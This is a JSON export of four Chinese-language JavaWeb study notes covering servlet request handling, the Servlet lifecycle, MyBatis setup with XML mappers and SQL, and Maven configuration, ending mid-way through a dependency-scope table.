[{"id":"a187860d1ed5ffaa4db85b694be3a055","title":"JavaWeb-Request&Response","content":"# 1、概述\n\nRequest：获取请求数据\nResponse：设置响应数据\nRequest：\n\nRequest 继承体系\nRequest 获取请求数据\nRequest 请求转发\n\n\n\n# 2、Request 继承体系\n\n\n实现类由 tomcat 提供\nTomcat 需要解析请求数据，封装为 request 对象，并且创建 request 对象传递到 service 方法中\n使用 request 对象，查阅 JavaEE API 文档的 HttpServletRequest 接口就行，因为 tomcat 是实现这个接口\nRequest 对象全名：org.apache.catalina.connector.RequestFacade@289d4a7\n\n# 3、Request 获取请求数据\n# 3.1 请求行\nGET &#x2F;request-demo&#x2F;req1?username&#x3D;zhangsan HTTP&#x2F;1.1\n\n请求方式 资源路径 请求参数 版本\n\n\n\n\n方法\n描述\n示例\n\n\n\n\nString getMethod();\n获取请求方式\nget\n\n\nString getContextPath();\n获取虚拟目录（项目访问路径）\n/request-demo\n\n\nStringBuffer getRequestURL();\n获取 URL（统一资源定位符）\nhttp://localhost:8080/request-demo/req1\n\n\nString getRequestURI();\n获取 URI（统一资源标识符）\n/request-demo/req1\n\n\nString getQueryString();\n获取请求参数（get 方式）\nusername=zhangsan&amp;password=123\n\n\n\n# 3.2 请求头\nUser-Agent:Mozilla&#x2F;5.0 Chrome&#x2F;91.0.4472.106\n\n\n\n方法\n描述\n\n\n\n\nString getHeader(String name);\n根据请求头名称，获取值\n\n\n\n# 3.3 请求体\nusername&#x3D;zhangsan&amp;password&#x3D;123\n\nServletInputStream getInputStream (); 获取字节输入流 —— 上传文件\nBufferedReader getReader (); 获取字符输入流 —— 纯文本\n\npackage com.itheima.web;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.BufferedReader;\nimport java.io.IOException;\n\n@WebServlet(\"/req-demo2\")\npublic class ServletRequestDemo2 extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //浏览器的版本信息\n        String header = req.getHeader(\"user-agent\");\n        System.out.println(header);\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //获取post请求体\n        BufferedReader reader = req.getReader();\n        //读取数据\n        String s = reader.readLine();\n        System.out.println(s);\n\n    &#125;\n&#125;\n# 3.4 通用方式获取请求参数\n\n请求参数获取方式：\n\nGET 方式： String getQueryString()\nPOST 方式： BufferedReader getReader()\n\n\n\n\n\nMap&lt;String, String []&gt; getParameterMap (): 获取所有参数 Map 集合\nString [] getParameterValues (String name): 根据名称获取参数值 (数组)\nString getParameter (String name): 根据名称获取参数值 (单个值)\n\npackage com.itheima.web;\n\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.Map;\n\n@WebServlet(\"/req-demo3\")\npublic class ServletRequestDemo3 extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //GET请求逻辑\n        System.out.println(\"get...\");\n        //1.获取所有参数的map集合\n        Map&lt;String, String[]> parameterMap = req.getParameterMap();\n        for (String key : parameterMap.keySet()) &#123;\n            System.out.print(key + \":\");\n            //获取值\n            String[] values = parameterMap.get(key);\n            for (String value : values) &#123;\n                System.out.print(value + \" \");\n            &#125;\n\n            System.out.println(\"\");\n        &#125;\n\n        System.out.println(\"------------------\");\n        //获取数组\n        String[] parameterValues = req.getParameterValues(\"hobby\");\n        for (String parameterValue : parameterValues) &#123;\n            System.out.println(parameterValue);\n        &#125;\n\n        System.out.println(\"-------------------\");\n        //根据key获取单个参数值\n        String parameter = req.getParameter(\"hobby\");\n        String uusername = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n        System.out.println(parameter);\n        System.out.println(uusername);\n        System.out.println(password);\n\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //post请求逻辑\n        this.doGet(req,resp);\n    &#125;\n&#125;\n\n最常用的就是 getParameter\n\n# 3.5 请求参数中文乱码处理\n\nPOST\n\n//在前面加一行\nreq.setCharacterEncoding(\"UTF-8\");//设置字符输入流的编码\n\nGET\n\n\nget 获取参数的方式：getQueryString\n\n\n\n做法：将解码后的数据再变成字节数据，再将字节数据使用 UTF-8 解码\n\nString username = req.getParameter(\"username\");\nbyte[] bytes = username.getBytes(\"ISO-8859-1\");\nusername = new String(bytes,\"UTF-8\");\n","slug":"JavaWeb-Request-Response","date":"2022-06-23T13:40:26.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"4d11604afebb47198cf52093f3d2208a","title":"JavaWeb-Servlet","content":"\n快速入门\nServlet 执行流程\nServlet 生命周期\nServlet 体系结构\nServlet URLPattern 配置\nXML 配置方式编写 Servlet\n\n# 1、快速入门\n\n创建 web 项目，导入 servlet 依赖坐标\n定义一个类，实现 Servlet 接口，并重写接口中所有方法，并在 service 方法中输入一句话\n在类上使用 @WebServlet 注解，配置该 Servlet 访问路径\n访问：启动 Tomcat，浏览器输入 url 访问 Servlet\n\npackage com.itheima.web;\n\nimport javax.servlet.*;\nimport javax.servlet.annotation.WebServlet;\nimport java.io.IOException;\n\n@WebServlet(\"/demo1\")\npublic class ServletDemo1 implements Servlet &#123;\n    public ServletDemo1() &#123;\n        super();\n    &#125;\n\n    @Override\n    public int hashCode() &#123;\n        return super.hashCode();\n    &#125;\n\n    @Override\n    public boolean equals(Object obj) &#123;\n        return super.equals(obj);\n    &#125;\n\n    @Override\n    protected Object clone() throws CloneNotSupportedException &#123;\n        return super.clone();\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return super.toString();\n    &#125;\n\n    @Override\n    protected void finalize() throws Throwable &#123;\n        super.finalize();\n    &#125;\n\n    public void init(ServletConfig servletConfig) throws ServletException &#123;\n\n    &#125;\n\n    public ServletConfig getServletConfig() &#123;\n        return null;\n    &#125;\n\n    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;\n        System.out.println(\"Servlet hello World\");\n    &#125;\n\n    public String getServletInfo() &#123;\n        return null;\n    &#125;\n\n    public void destroy() &#123;\n\n    &#125;\n&#125;\n# 2、Servlet 执行流程\n\nServlet 由谁创建？Servlet 由谁调用？\n\nServlet 由 web 服务器创建，Servlet 方法由 web 服务器调用\n\n\n服务器怎么知道 Servlet 中一定有 Service 方法？\n\n因为我们自定义的 Servlet，必须实现 Servlet 接口并复写其方法，而 Servlet 接口中有 service 方法\n\n\n\n# 3、生命周期\n\n对象的生命周期指一个对象从被创建到被销毁的整个过程\nServlet 运行在 Servlet 容器 (web 服务器) 中，其生命周期由容器来管理，分为 4 个阶段：\n\n\n加载和实例化：默认情况下，当 Servlet 第一次被访问时，由容器创建 Servlet 对象\n\n默认情况，Servlet会在第一次访问被容器创建，但是如果创建Servlet比较耗时的话，那么第一个访问的人等待的时间就比较长，用户的体验就比较差，那么我们能不能把Servlet的创建放到服务器启动的时候来创建，具体如何来配置?\n\n@WebServlet(urlPatterns = \"/demo1\",loadOnStartup = 1)\nloadOnstartup的取值有两类情况\n\t（1）负整数:第一次访问时创建Servlet对象\n\t（2）0或正整数:服务器启动时创建Servlet对象，数字越小优先级越高\n\n初始化：在 Servlet 实例化之后，容器将调用 Servlet 的 init () 方法初始化这个对象，完成一些如加载配置文件、创建连接等初始化的工作。该方法只调用一次\n请求处理：每次请求 Servlet 时，Servlet 容器都会调用 Servlet 的 ==service ()== 方法对请求进行处理\n服务终止：当需要释放内存或者容器关闭时，容器就会调用 Servlet 实例的 ==destroy ()== 方法完成资源的释放。在 destroy () 方法调用之后，容器会释放这个 Servlet 实例，该实例随后会被 Java 的垃圾收集器所回收\n\n# 4、方法介绍\n\n初始化方法，在 Servlet 被创建时执行，只执行一次\n\nvoid init(ServletConfig config)\n\n提供服务方法，每次 Servlet 被访问，都会调用该方法\n\nvoid service(ServletRequest servletRequest, ServletResponse servletResponse)\n\n销毁方法，当 Servlet 被销毁时，调用该方法，在内存释放或服务器关闭时销毁 Servlet\n\nvoid destory()\n\n获取 ServletConfig 对象\n\nServletConfig getServletConfig()\n\n获取 Servlet 信息\n\nString getServletInfo()\n# 5、Servlet 体系结构\n\n我们将来开发 B/S 架构的 web 项目，都是针对 HTTP 协议，所以我们自定义 Servlet，会继承 HttpServlet\n\n手写 Servlet 实现方法，这个代码\n\npublic void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;\n    //根据请求方式不同进行分别处理\n    HttpServletRequest request = (HttpServletRequest) servletRequest;\n\n    //1.获取请求方式\n    String method = request.getMethod();\n    //2.判断\n    if(\"GET\".equals(method)) &#123;\n        //get方式的处理逻辑\n        doget(req,res);\n    &#125; else if(\"POST\".equals(method)) &#123;\n        //post方式的处理逻辑\n        dopost(req,res);\n    &#125;\n&#125;\n# 6、Servlet URLPattern 配置\n\nServlet 想要被访问，必须配置其访问路径 (urlPattern)\n\n\n一个 Servlet，可以配置多个 URLPattern\n\n@WebServlet(urlPatterns = {&quot;/demo1&quot;, “/demo2”})\n\n\nURLPattern 配置规则\n\n①精确匹配 ②目录匹配 ③扩展名匹配 ④任意匹配\n\n\n\n\n# 7、XML 配置 Servlet\n&lt;servlet>\n  &lt;servlet-name>demo13&lt;/servlet-name>\n  &lt;servlet-class>com.itheima.web.ServletDemo13&lt;/servlet-class>\n&lt;/servlet>\n&lt;servlet-mapping>\n  &lt;servlet-name>demo13&lt;/servlet-name>\n  &lt;url-pattern>/demo13&lt;/url-pattern>\n&lt;/servlet-mapping>\n","slug":"JavaWeb-Servlet","date":"2022-06-23T13:39:08.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"fa6e3171176b562ddf4dd344027e42d6","title":"JavaWeb-MyBatis","content":"# 1、Mybatis 概述\n# 1.1  Mybatis 概念\n\n\n\n\n\n\n\n\n\n\n\nMyBatis 是一款优秀的持久层框架，用于简化 JDBC 开发\n\n\nMyBatis 本是 Apache 的一个开源项目 iBatis, 2010 年这个项目由 apache software foundation 迁移到了 google code，并且改名为 MyBatis 。2013 年 11 月迁移到 Github\n\n\n官网：https://mybatis.org/mybatis-3/zh/index.html\n\n\n持久层：\n\n\n负责将数据到保存到数据库的那一层代码。\n以后开发我们会将操作数据库的 Java 代码作为持久层。而 Mybatis 就是对 jdbc 代码进行了封装。\n\n\nJavaEE 三层架构：表现层、业务层、持久层\n三层架构在后期会给大家进行讲解，今天先简单的了解下即可。\n\n\n框架：\n\n框架就是一个半成品软件，是一套可重用的、通用的、软件基础代码模型\n在框架的基础之上构建软件编写更加高效、规范、通用、可扩展\n\n举例给大家简单的解释一下什么是半成品软件。大家小时候应该在公园见过给石膏娃娃涂鸦\n\n如下图所示有一个石膏娃娃，这个就是一个半成品。你可以在这个半成品的基础上进行不同颜色的涂鸦\n\n了解了什么是 Mybatis 后，接下来说说以前  JDBC代码  的缺点以及 Mybatis 又是如何解决的。\n# 1.2  JDBC 缺点\n下面是 JDBC 代码，我们通过该代码分析都存在什么缺点：\n\n\n\n硬编码\n\n\n注册驱动、获取连接\n上图标 1 的代码有很多字符串，而这些是连接数据库的四个基本信息，以后如果要将 Mysql 数据库换成其他的关系型数据库的话，这四个地方都需要修改，如果放在此处就意味着要修改我们的源代码。\n\n\nSQL 语句\n上图标 2 的代码。如果表结构发生变化，SQL 语句就要进行更改。这也不方便后期的维护。\n\n\n\n\n操作繁琐\n\n\n手动设置参数\n\n\n手动封装结果集\n上图标 4 的代码是对查询到的数据进行封装，而这部分代码是没有什么技术含量，而且特别耗费时间的。\n\n\n\n\n# 1.3  Mybatis 优化\n\n硬编码可以配置到配置文件\n操作繁琐的地方 mybatis 都自动完成\n\n如图所示\n\n下图是持久层框架的使用占比。\n\n# 2、Mybatis 快速入门\n# 2.1 步骤\n\n创建 User 表，添加数据\n创建模块，导入坐标\n编写 mybatis 核心配置文件 -&gt; 替换连接信息，解决硬编码问题\n编写 SQL 映射文件 -&gt; 统一管理 SQL 语句，解决硬编码问题\n编码\n\n定义 pojo 类\n加载核心配置文件，获取 SQLSessionFactory 对象\n获取 SQLSession 对象，执行 SQL 语句\n释放资源\n\n\n\n# 2.2 详细操作\n\n在 pom.xml 中导入相关依赖，logback 和 slf4j 都是用来查看日志的，直接复制\n\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>org.mybatis&lt;/groupId>\n        &lt;artifactId>mybatis&lt;/artifactId>\n        &lt;version>3.5.5&lt;/version>\n    &lt;/dependency>\n\n    &lt;dependency>\n        &lt;groupId>mysql&lt;/groupId>\n        &lt;artifactId>mysql-connector-java&lt;/artifactId>\n        &lt;version>5.1.46&lt;/version>\n    &lt;/dependency>\n\n    &lt;dependency>\n        &lt;groupId>junit&lt;/groupId>\n        &lt;artifactId>junit&lt;/artifactId>\n        &lt;version>4.13&lt;/version>\n        &lt;scope>test&lt;/scope>\n    &lt;/dependency>\n\n    &lt;!-- 添加slf4j日志api -->\n    &lt;dependency>\n        &lt;groupId>org.slf4j&lt;/groupId>\n        &lt;artifactId>slf4j-api&lt;/artifactId>\n        &lt;version>1.7.20&lt;/version>\n    &lt;/dependency>\n    &lt;!-- 添加logback-classic依赖 -->\n    &lt;dependency>\n        &lt;groupId>ch.qos.logback&lt;/groupId>\n        &lt;artifactId>logback-classic&lt;/artifactId>\n        &lt;version>1.2.3&lt;/version>\n    &lt;/dependency>\n    &lt;!-- 添加logback-core依赖 -->\n    &lt;dependency>\n        &lt;groupId>ch.qos.logback&lt;/groupId>\n        &lt;artifactId>logback-core&lt;/artifactId>\n        &lt;version>1.2.3&lt;/version>\n    &lt;/dependency>\n&lt;/dependencies>\n\n在 main 的 resources 下创建 logback.xml，内容如下\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;configuration>\n    &lt;!--\n        CONSOLE ：表示当前的日志信息是可以输出到控制台的。\n    -->\n    &lt;appender name=\"Console\" class=\"ch.qos.logback.core.ConsoleAppender\">\n        &lt;encoder>\n            &lt;pattern>[%level] %blue(%d&#123;HH:mm:ss.SSS&#125;) %cyan([%thread]) %boldGreen(%logger&#123;15&#125;) - %msg %n&lt;/pattern>\n        &lt;/encoder>\n    &lt;/appender>\n\n    &lt;logger name=\"com.itheima\" level=\"DEBUG\" additivity=\"false\">\n        &lt;appender-ref ref=\"Console\"/>\n    &lt;/logger>\n\n\n    &lt;!--\n\n      level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF\n     ， 默认debug\n      &lt;root>可以包含零个或多个&lt;appender-ref>元素，标识这个输出位置将会被本日志级别控制。\n      -->\n    &lt;root level=\"DEBUG\">\n        &lt;appender-ref ref=\"Console\"/>\n    &lt;/root>\n&lt;/configuration>\n\n在 main 的 resources 下创建 mybatis-config.xml，内容如下\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n&lt;!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n&lt;configuration>\n    &lt;environments default=\"development\">\n        &lt;environment id=\"development\">\n            &lt;transactionManager type=\"JDBC\"/>\n            &lt;dataSource type=\"POOLED\">\n&lt;!--                数据库配置，自行修改-->\n                &lt;property name=\"driver\" value=\"com.mysql.jdbc.Driver\"/>\n                &lt;property name=\"url\" value=\"jdbc:mysql:///mybatis?useSSL=false\"/>\n                &lt;property name=\"username\" value=\"root\"/>\n                &lt;property name=\"password\" value=\"root\"/>\n            &lt;/dataSource>\n        &lt;/environment>\n    &lt;/environments>\n    &lt;mappers>\n        &lt;mapper resource=\"UserMapper.xml\"/>\n    &lt;/mappers>\n&lt;/configuration>\n\n在 main 的 resources 下创建 UserMapper.xml，Mapper 为映射文件，命名规则为表名 Mapper.xml，namespace 为名称空间，id 为唯一标识 sql 语句的符号，在执行 SQL 语句时需要使用；resultType 为查询结果要放的类\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n&lt;!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n&lt;!--\n    namespace：标签空间\n\n-->\n&lt;mapper namespace=\"test\">\n    &lt;select id=\"selectAll\" resultType=\"com.itheima.pojo.User\">\n        select * from tb_user;\n    &lt;/select>\n&lt;/mapper>\n\n测试编码\n\npackage com.itheima;\n\nimport com.itheima.pojo.User;\nimport org.apache.ibatis.io.Resources;\nimport org.apache.ibatis.session.SqlSession;\nimport org.apache.ibatis.session.SqlSessionFactory;\nimport org.apache.ibatis.session.SqlSessionFactoryBuilder;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\npublic class MybatisDemo &#123;\n    public static void main(String[] args) throws IOException &#123;\n        //1.加载mybatis核心配置文件，获取sqlSessionFactory，这一段直接复制官网\n        //配置文件工作路径直接在resources下找\n        String resource = \"mybatis-config.xml\";\n        InputStream inputStream = Resources.getResourceAsStream(resource);\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);\n\n        //2.获取SQLSession对象来执行SQL语句\n        SqlSession sqlSession = sqlSessionFactory.openSession();\n\n        //3.执行SQL语句\n        List&lt;User> users = sqlSession.selectList(\"test.selectAll\");\n\n        System.out.println(users);\n\n        //4.释放资源\n        sqlSession.close();\n    &#125;\n&#125;\n# 3、Mapper 代理开发\n\n目的：\n\n解决原生方式中的硬编码\n简化后期 SQL 执行\n\n\n\n\n\n\n\n\n\n\n\n\n\nUserMapper：接口，里面会有很多方法，会和配置文件里的 id 名称一一对应\n# 3.1 使用 Mapper 代理开发完成入门案例\n\n定义与 SQL 映射文件同名的 Mapper 接口，并且将 Mapper 接口和 SQL 映射文件放置在同一目录下\n\n注意：maven 要求配置文件和 java 代码分开。因此不要将配置文件直接拖到代码目录，可以在 resources 目录下建立与 Mapper 接口同级别同名的目录树\n\n\n设置 SQL 映射文件的 namespace 属性为 Mapper 接口全限定名\n在 Mapper 接口中定义方法，方法名就是 SQL 映射文件中 SQL 语句的 id，并保持参数类型和返回值一致\n编码\n\n通过 SQLSession 的 getMapper 获取 Mapper 接口的代理对象\n调用对应方法完成 SQL\n\n\n\n\n\n目录树结构：\n\n\n\n映射的名称空间为接口的全限定名\n\n\n\n定义方法，方法名是映射文件 SQL 的 id，没有参数，返回值是一个 User 的集合，由于配置文件路径改了，要在 mybatis-config.xml 中更改 mapper resources 的路径\n\n\n\n4、编码\npackage com.itheima;\n\nimport com.itheima.mapper.UserMapper;\nimport com.itheima.pojo.User;\nimport org.apache.ibatis.io.Resources;\nimport org.apache.ibatis.session.SqlSession;\nimport org.apache.ibatis.session.SqlSessionFactory;\nimport org.apache.ibatis.session.SqlSessionFactoryBuilder;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\n/**\n * mybatis代理开发\n */\npublic class MybatisDemo2 &#123;\n    public static void main(String[] args) throws IOException &#123;\n        //1.加载mybatis核心配置文件，获取sqlSessionFactory\n        String resource = \"mybatis-config.xml\";\n        InputStream inputStream = Resources.getResourceAsStream(resource);\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);\n\n        //2.获取SQLSession对象来执行SQL语句\n        SqlSession sqlSession = sqlSessionFactory.openSession();\n\n        //3.获取UserMapper接口的代理对象\n        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);\n        List&lt;User> users = userMapper.selectAll();\n        System.out.println(users);\n\n        //4.释放资源\n        sqlSession.close();\n    &#125;\n&#125;\n# 4、Mybatis 核心配置文件\n\n\n核心配置文件：mybatis-config.xml\n\n\nenvironments：环境，里面有 environment，可以配置多个不同的数据库，通过改变 default 来改变数据源\n\n\n&lt;!--    配置数据库连接环境信息，可以配置多个environment，通过对应的default属性来切换数据库-->\n    &lt;environments default=\"development\">\n        &lt;environment id=\"development\">\n            &lt;transactionManager type=\"JDBC\"/>\n            &lt;dataSource type=\"POOLED\">\n&lt;!--                数据库配置-->\n                &lt;property name=\"driver\" value=\"com.mysql.jdbc.Driver\"/>\n                &lt;property name=\"url\" value=\"jdbc:mysql:///mybatis?useSSL=false\"/>\n                &lt;property name=\"username\" value=\"root\"/>\n                &lt;property name=\"password\" value=\"root\"/>\n            &lt;/dataSource>\n        &lt;/environment>\n    &lt;/environments>\n\ntypeAliases：别名，作用：将包目录下的类起一个别名，这样在 mapper 中就不需要写类的全名了，且不区分大小写\n\n&lt;typeAliases&gt;\n\t&lt;package name&#x3D;&quot;com.itheima.pojo&#x2F;&quot;&gt;\n&lt;&#x2F;typeAliases&gt;\n\n\n配置别名时要遵守标签顺序\n\n# 5、配置文件完成增删改查\n\n\n要完成的功能列表清单\n\n查询\n\n查询所有数据\n查看详情\n条件查询\n\n\n添加\n修改\n\n修改全部字段\n修改动态字段\n\n\n删除\n\n删除一个\n批量删除\n\n\n\n\n\n准备环境\n\n数据库表 tb_brand\n实体类 Brand\n测试用例\n安装 MyBatisX 插件\n\n\n\n-- 删除tb_brand表\ndrop table if exists tb_brand;\n-- 创建tb_brand表\ncreate table tb_brand\n(\n    -- id 主键\n    id           int primary key auto_increment,\n    -- 品牌名称\n    brand_name   varchar(20),\n    -- 企业名称\n    company_name varchar(20),\n    -- 排序字段\n    ordered      int,\n    -- 描述信息\n    description  varchar(100),\n    -- 状态：0：禁用  1：启用\n    status       int\n);\n-- 添加数据\ninsert into tb_brand (brand_name, company_name, ordered, description, status)\nvalues ('三只松鼠', '三只松鼠股份有限公司', 5, '好吃不上火', 0),\n       ('华为', '华为技术有限公司', 100, '华为致力于把数字世界带入每个人、每个家庭、每个组织，构建万物互联的智能世界', 1),\n       ('小米', '小米科技有限公司', 50, 'are you ok', 1);\n\n\nSELECT * FROM tb_brand;\n# 5.1 查询所有数据\n\n编写接口方法：Mapper 接口\n\n参数：无\n结果：List&lt;Brand&gt;\n\n\n编写 SQL 语句：SQL 映射文件\n执行方法，测试\n\n\n\n核心内容：SQL 语句怎么写，参数要什么，结果怎么处理\n\n\n碰到的问题：数据库表的字段名称和实体类的属性名称不一样，则不能自动封装数据\n\n\n解决方法:\n\n\n起别名，对不一样的列明起别名，让列名和属性名一样\n\n\n定义 SQL 片段\n&lt;sql id=\"brand_column\">\n    id,brand_name as brandName,company_name as companyName,ordered,description,status\n&lt;/sql>\n&lt;select id=\"selectAll\" resultType=\"brand\">\n    select\n        &lt;include refid=\"brand_column\"/>\n    from tb_brand;\n&lt;/select>\n\n\nresultMap\n\nid：唯一标识\ntype：映射的类型，支持别名\n字标签：id：完成主键字段的映射\n字标签：result：完成一般字段的映射\n属性：column（列名），property（实体类的属性名）\n\n&lt;resultMap id=\"brandResultMap\" type=\"brand\">\n    &lt;result column=\"brand_name\" property=\"brandName\" />\n    &lt;result column=\"company_name\" property=\"companyName\" />\n&lt;/resultMap>\n    &lt;select id=\"selectAll\" resultMap=\"brandResultMap\">\n        select\n            *\n        from tb_brand;\n    &lt;/select>\n\n\n\n\n\n\n# 5.2 查询 - 查看详情\n\n参数占位符：\n\n#{}：使用预编译，将其替换为？，为防止 SQL 注入\n${}：直接拼接参数，会存在 SQL 注入问题\n\n\n使用时机：\n\n传递参数的时候：#{}\n表名或者列名不固定的情况下：${}，但是只要用 $ 就会存在注入问题\n\n\n特殊字符处理\n\n转义字符：xml 转义字符\nCDATA 区：CD 补全\n\n\n\n","slug":"JavaWeb-MyBatis","date":"2022-06-23T13:38:28.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"de916a02e234c53ab1fc7473c41a0ed5","title":"JavaWeb-Maven","content":"# 1、Maven 概述\n\nMaven 是专门用于管理和构建 Java 项目的工具，它的主要功能有：\n\n提供了一套标准化的项目结构\n提供了一套标准化的构建流程（编译、测试、打包、发布）\n提供了一套依赖管理机制\n\n\n标准化项目结构：\n\n\n\n标准化构建流程：\n\n\n\n提供了一套依赖管理机制\n\n\n\n\n\n\n\n\n\n\n\n\nMaven 简介\nMaven 安装配置\nMaven 基本使用\nIDEA 配置 Maven\n依赖管理\n\n# 2、Maven 简介\n\nApache Maven 是一个项目管理和构建工具，它基于项目对象模型（POM）的概念，通过一小段描述信息来管理项目的构建、报告和文档\n官网：http://maven.apache.org/\n\n\n\n\n\n\n\n\n\n\n\n项目对象模型 (Project Object Model)\n依赖管理模型 (Dependency)\n插件 (Plugin)\n\n\n\n仓库分类\n\n本地仓库：自己计算机上的目录\n中央仓库：由 Maven 团队维护的全球唯一的仓库\n\n地址：https://repo1.maven.org/maven2/\n\n\n远程仓库：一般由公司团队搭建的私有仓库\n\n\n写了一个依赖后 Maven 会先到本地仓库找，本地仓库如果没有会去中央仓库找，中央仓库找到之后会将这个依赖 jar 包下载到本地仓库，如果架设了私服，会先到私服找，私服再找不到然后去中央仓库找\n\n# 3、Maven 安装与配置\n\n解压 apache-maven 即为安装完成\n配置环境变量 MAVEN-HOME 为安装路径的 bin 目录\n配置本地仓库：修改 conf/settings.xml 中的 &lt;localRepository&gt; 为一个指定目录\n配置阿里云私服：修改 conf/settings.xml 中的 &lt;mirrors&gt; 标签，为其添加如下子标签\n\n&lt;mirror&gt;\n\t&lt;id&gt;alimaven&lt;&#x2F;id&gt;\n\t&lt;name&gt;aliyun maven&lt;&#x2F;name&gt;\n\t&lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;\n\t&lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;\n&lt;&#x2F;mirror&gt;\n# 4、Maven 的基本使用\n# 4.1 Maven 常用命令\n\n\ncompile：编译\n\n\nclean：清理\n\n\ntest：测试\n\n\npackage：打包\n\n\ninstall：安装\n\n\n# 4.2 Maven 生命周期\n\nMaven 构建项目生命周期描述的是一次构建过程经历了多少事件\nMaven 对项目构建的生命周期划分为 3 套\n\nclean：清理工作\ndefault：核心工作，例如编译、测试、打包、安装等\nsite：产生报告，发布站点等\n\n\n\n\n\n# 5、IDEA 配置 Maven\n# 5.1 IDEA 配置 Maven 环境\n我们需要先在 IDEA 中配置 Maven 环境：\n\n\n选择 IDEA 中 File --&gt; Settings\n\n\n\n搜索 maven\n\n\n\n设置 IDEA 使用本地安装的 Maven，并修改配置文件路径\n\n\n\n# 5.2 Maven 坐标详解\n什么是坐标？\n\nMaven 中的坐标是资源的唯一标识\n使用坐标来定义项目或引入项目中需要的依赖\n\nMaven 坐标主要组成\n\ngroupId：定义当前 Maven 项目隶属组织名称（通常是域名反写，例如：com.itheima）\nartifactId：定义当前 Maven 项目名称（通常是模块名称，例如 order-service、goods-service）\nversion：定义当前项目版本号\n\n如下图就是使用坐标表示一个项目：\n\n\n\n\n\n\n\n\n\n\n注意：\n\n上面所说的资源可以是插件、依赖、当前项目。\n我们的项目如果被其他的项目依赖时，也是需要坐标来引入的。\n\n# 5.3 创建 Maven 项目\nFile-&gt;Project Structure-&gt;Modules-&gt;±&gt;New module\n\n# 5.4 导入 Maven 项目\n大家在学习时可能需要看老师的代码，当然也就需要将老师的代码导入到自己的 IDEA 中。我们可以通过以下步骤进行项目的导入：\n\n\n选择右侧 Maven 面板，点击 + 号\n\n\n\n选中对应项目的 pom.xml 文件，双击即可\n\n\n\n配置 Maven-Helper 插件\n\n\n选择 IDEA 中 File --&gt; Settings\n\n\n\n选择 Plugins\n\n\n\n搜索 Maven，选择第一个 Maven Helper，点击 Install 安装，弹出面板中点击 Accept\n\n\n\n重启 IDEA\n\n\n安装完该插件后可以通过 选中项目右键进行相关命令操作，如下图所示：\n\n# 6、依赖管理\n# 6.1  使用坐标引入 jar 包\n使用坐标引入 jar 包的步骤：\n\n\n在项目的 pom.xml 中编写  标签\n\n\n在  标签中 使用  引入坐标\n\n\n定义坐标的 groupId，artifactId，version\n\n\n\n点击刷新按钮，使坐标生效\n\n\n\n\n\n\n\n\n\n\n\n\n注意：\n\n具体的坐标我们可以到如下网站进行搜索\nhttps://mvnrepository.com/\n\n快捷方式导入 jar 包的坐标：\n每次需要引入 jar 包，都去对应的网站进行搜索是比较麻烦的，接下来给大家介绍一种快捷引入坐标的方式\n\n\n在 pom.xml 中 按 alt + insert，选择 Dependency\n\n\n\n在弹出的面板中搜索对应坐标，然后双击选中对应坐标\n\n\n\n点击刷新按钮，使坐标生效\n\n\n\n自动导入设置：\n上面每次操作都需要点击刷新按钮，让引入的坐标生效。当然我们也可以通过设置让其自动完成\n\n\n选择 IDEA 中 File --&gt; Settings\n\n\n\n在弹出的面板中找到 Build Tools\n\n\n\n选择 Any changes，点击 ok 即可生效\n\n\n# 6.2  依赖范围\n通过设置坐标的依赖范围 (scope)，可以设置 对应 jar 包的作用范围：编译环境、测试环境、运行环境。\n如下图所示给  junit  依赖通过  scope  标签指定依赖的作用范围。 那么这个依赖就只能作用在测试环境，其他环境下不能使用。\n\n那么  scope  都可以有哪些取值呢？\n\n\n\n依赖范围\n编译 classpath\n测试 classpath\n运行 classpath\n例子\n\n\n\n\ncompile\nY\nY\nY\nlogback\n\n\ntest\n-\nY\n-\nJunit\n\n\nprovided\nY\nY\n-\nservlet-api\n\n\nruntime\n-\nY\nY\njdbc 驱动\n\n\nsystem\nY\nY\n-\n存储在本地的 jar 包\n\n\n\n\ncompile 